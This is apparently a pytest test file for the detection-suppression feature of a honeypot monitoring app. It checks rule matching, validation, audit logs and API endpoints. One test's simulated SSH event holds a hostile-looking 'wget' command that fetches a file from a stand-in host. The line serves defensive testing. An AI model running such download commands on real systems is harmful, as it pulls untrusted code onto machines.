from datetime import datetime, timedelta, timezone

import pytest

from aegis_nexus.app import create_app
from aegis_nexus.detection_suppression import (
    DetectionSuppressionStore,
    SuppressionValidationError,
)


def _future(hours: int = 1) -> str:
    return (datetime.now(timezone.utc) + timedelta(hours=hours)).isoformat()


def test_suppression_store_matches_exact_rule_and_optional_source(tmp_path):
    store = DetectionSuppressionStore(str(tmp_path / "suppressions.db"))
    item = store.create(
        rule_id="download_attempt",
        source_ip="203.0.113.10",
        owner="soc-analyst",
        reason="Approved scanner validation window",
        expires_at=_future(),
    )
    assert item["active"] is True
    assert store.match({"rule_id": "download_attempt", "source_ip": "203.0.113.10"})["id"] == item["id"]
    assert store.match({"rule_id": "download_attempt", "source_ip": "203.0.113.11"}) is None
    assert store.match({"rule_id": "command_staging_detected", "source_ip": "203.0.113.10"}) is None


def test_suppression_store_requires_owner_reason_future_expiry_and_known_rule(tmp_path):
    store = DetectionSuppressionStore(str(tmp_path / "validation.db"))
    with pytest.raises(SuppressionValidationError):
        store.create(
            rule_id="invented_rule",
            owner="analyst",
            reason="test",
            expires_at=_future(),
        )
    with pytest.raises(SuppressionValidationError):
        store.create(
            rule_id="download_attempt",
            owner="",
            reason="test",
            expires_at=_future(),
        )
    with pytest.raises(SuppressionValidationError):
        store.create(
            rule_id="download_attempt",
            owner="analyst",
            reason="",
            expires_at=_future(),
        )
    with pytest.raises(SuppressionValidationError):
        store.create(
            rule_id="download_attempt",
            owner="analyst",
            reason="test",
            expires_at=(datetime.now(timezone.utc) - timedelta(minutes=1)).isoformat(),
        )
    with pytest.raises(SuppressionValidationError):
        store.create(
            rule_id="download_attempt",
            owner="analyst",
            reason="test",
            expires_at=(datetime.now(timezone.utc) + timedelta(days=31)).isoformat(),
        )


def test_suppression_create_and_delete_are_audited(tmp_path):
    store = DetectionSuppressionStore(str(tmp_path / "audit.db"))
    item = store.create(
        rule_id="download_attempt",
        owner="analyst-a",
        reason="maintenance",
        expires_at=_future(),
    )
    assert store.delete(item["id"], actor="analyst-b") is True
    audit = list(reversed(store.audit(suppression_id=item["id"])))
    assert [entry["action"] for entry in audit] == ["created", "deleted"]
    assert audit[0]["actor"] == "analyst-a"
    assert audit[1]["actor"] == "analyst-b"
    assert store.get(item["id"]) is None


def test_active_suppression_prevents_alert_but_preserves_event(tmp_path):
    app = create_app({
        "TESTING": True,
        "DATABASE_PATH": str(tmp_path / "integration.db"),
        "INGEST_API_KEY": "sensor-secret",
    })
    client = app.test_client()
    created = client.post(
        "/api/v1/detection/suppressions",
        json={
            "rule_id": "download_attempt",
            "source_ip": "203.0.113.10",
            "owner": "soc-analyst",
            "reason": "Known validation source",
            "expires_at": _future(),
        },
    )
    assert created.status_code == 201

    timestamp = datetime.now(timezone.utc).isoformat()
    response = client.post(
        "/api/v1/events",
        headers={"X-Aegis-Key": "sensor-secret"},
        json={
            "timestamp": timestamp,
            "honeypot": "ssh-decoy-01",
            "event_type": "command",
            "observed": {
                "source_ip": "203.0.113.10",
                "service": "ssh",
                "protocol": "tcp",
                "destination_port": 22,
                "command": "wget http://example.invalid/a",
            },
        },
    )
    assert response.status_code == 201
    event_id = response.get_json()["id"]
    assert client.get(f"/api/v1/events/{event_id}").status_code == 200
    alerts = client.get("/api/v1/alerts").get_json()["items"]
    assert "download_attempt" not in {item["rule_id"] for item in alerts}


def test_suppression_api_exposes_audit_and_requires_actor_to_delete(tmp_path):
    app = create_app({"TESTING": True, "DATABASE_PATH": str(tmp_path / "api.db")})
    client = app.test_client()
    created = client.post(
        "/api/v1/detection/suppressions",
        json={
            "rule_id": "web_scanning",
            "owner": "analyst-a",
            "reason": "Temporary tuning",
            "expires_at": _future(),
        },
    )
    assert created.status_code == 201
    suppression_id = created.get_json()["id"]
    assert client.delete(
        f"/api/v1/detection/suppressions/{suppression_id}",
        json={},
    ).status_code == 422
    assert client.delete(
        f"/api/v1/detection/suppressions/{suppression_id}",
        json={"actor": "analyst-b"},
    ).status_code == 204
    audit = client.get(
        "/api/v1/detection/suppressions/audit",
        query_string={"suppression_id": suppression_id},
    ).get_json()["items"]
    assert {entry["action"] for entry in audit} == {"created", "deleted"}
